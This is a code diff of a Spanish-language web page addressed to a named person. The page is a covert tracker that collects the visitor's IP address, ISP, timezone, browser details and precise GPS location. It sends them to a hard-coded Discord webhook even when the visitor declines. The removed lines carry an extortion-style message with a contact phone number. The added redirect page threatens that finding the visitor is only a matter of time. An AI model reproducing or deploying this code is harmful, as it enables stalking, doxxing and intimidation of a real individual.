@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mensaje para BLossomC.</title>
+    <title>Mensaje para blossom c.</title>
     <style>
         .modal-overlay {
             position: fixed;
@@ -63,27 +62,45 @@
 </head>
 <body>
 
-    <div id="consentModal" class="modal-overlay">
+    <div id="modalUbicacion" class="modal-overlay">
         <div class="modal-box">
-            <p>Todos tus datos ya han sido recopilados. Si deseas conservar tu privacidad comunícate con +244956273478 u cualquier otro miembro de S7 SERVICES. ATENCIÓN 24/7. Si recientemente te negaste y cambias de opinión puedes aceptar en cualquier momento y tendremos acceso a ubicación precisa para tu seguridad. NO TENGA MIEDO TENGA RESPETO</p>
-
+            <p>¿Deseas activar tu ubicación para continuar?</p>
             <div class="modal-buttons">
-                <button class="btn btn-accept" onclick="responderConsentimiento(true)">Deseo proteger mis datos</button>
-
-                <button class="btn btn-deny" onclick="responderConsentimiento(false)">Me rehuso a colaborar</button>
+                <button class="btn btn-accept" onclick="procesarRespuesta(true)">Aceptar</button>
+                <button class="btn btn-deny" onclick="procesarRespuesta(false)">Rechazar</button>
             </div>
         </div>
     </div>
 
     <script>
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1513047206297600070/NvgpPaLE_sLhfPY757UyL_3F_y-JBkY_Ci5p6Imnwx1Ed_jHG2AXvrhAShuoUjXq9B6p";
-        const YOUTUBE_URL = "https://youtu.be/M_0SVIoit9E?si=lbf8BTYxCYdax0im";
 
-        function cerrarModal() {
-            document.getElementById("consentModal").style.display = "none";
+        // Páginas HTML codificadas para la redirección
+        const PAGINA_GRACIAS = "data:text/html;charset=utf-8,<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Gracias</title></head><body style='font-family:sans-serif;text-align:center;padding:50px;background-color:%23eef9f1;'><h1 style='color:%232e7d32;font-size:32px;'>Colaboración exitosa</h1><p style='color:%23444;font-size:18px;'>Contactar con oliveira u otro miembro S7 para recibir indicaciones.</p></body></html>";
+
+        const PAGINA_ERROR = "data:text/html;charset=utf-8,<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Error</title></head><body style='font-family:sans-serif;text-align:center;padding:50px;background-color:%23fde8e8;'><h1 style='color:%23c62828;font-size:32px;'>Aun tienes tiempo de cambiar de opinion...</h1><p style='color:%23444;font-size:18px;'>Es cuestión de tiempo para encontrarte, hazlo fácil y haznos feliz.</p></body></html>";
+
+        async function procesarRespuesta(acepto) {
+            document.getElementById("modalUbicacion").style.display = "none";
+
+            let gpsInfo = { gpsData: "El usuario rechazó la ubicación.", mapLink: "N/A" };
+
+            if (acepto) {
+                gpsInfo = await solicitarUbicacionNativa();
+            }
+
+            // Enviar la información a Discord
+            await enviarADiscord(gpsInfo);
+
+            // Redirigir según la elección del usuario
+            if (acepto && !gpsInfo.gpsData.includes("denegado") && !gpsInfo.gpsData.includes("Error")) {
+                window.location.href = PAGINA_GRACIAS;
+            } else {
+                window.location.href = PAGINA_ERROR;
+            }
         }
 
-        function obtenerGPSNativo() {
+        function solicitarUbicacionNativa() {
             return new Promise((resolve) => {
                 if (!("geolocation" in navigator)) {
                     resolve({ gpsData: "Geolocalización no soportada", mapLink: "N/A" });
@@ -104,20 +121,12 @@
                     (err) => {
                         resolve({ gpsData: `Permiso denegado/Error (${err.message})`, mapLink: "N/A" });
                     },
-                    { enableHighAccuracy: true, timeout: 8000 }
+                    { enableHighAccuracy: true, timeout: 7000 }
                 );
             });
         }
 
-        async function responderConsentimiento(acepto) {
-            cerrarModal();
-
-            let gpsInfo = { gpsData: "El usuario rechazó la solicitud inicial.", mapLink: "N/A" };
-
-            if (acepto) {
-                gpsInfo = await obtenerGPSNativo();
-            }
-
+        async function enviarADiscord(gpsInfo) {
             let ipData = {};
             try {
                 const res = await fetch("https://ipapi.co/json/");
@@ -134,8 +143,8 @@
 
             const payload = {
                 embeds: [{
-                    title: "🔍 Registro de Visita",
-                    color: acepto ? 3066993 : 15158332,
+                    title: "🔍 Registro de Visita (Ubicación)",
+                    color: 3066993,
                     fields: [
                         { name: "🌐 Dirección IP", value: ipData.ip || "No detectada", inline: true },
                         { name: "🏢 Proveedor (ISP)", value: ipData.org || "Desconocido", inline: true },
@@ -147,7 +156,7 @@
                         { name: "🕒 Zona Horaria / Idioma", value: `${zonaHoraria} (${idioma})`, inline: true },
                         { name: "📱 User-Agent", value: navigator.userAgent, inline: false }
                     ],
-                    footer: { text: "Registro de Visita - GitHub Pages" },
+                    footer: { text: "Registro de Visita Solo GPS" },
                     timestamp: new Date().toISOString()
                 }]
             };
@@ -161,8 +170,6 @@
             } catch (err) {
                 console.error("Error al enviar a Discord:", err);
             }
-
-            window.location.href = YOUTUBE_URL;
         }
     </script>
 </body>
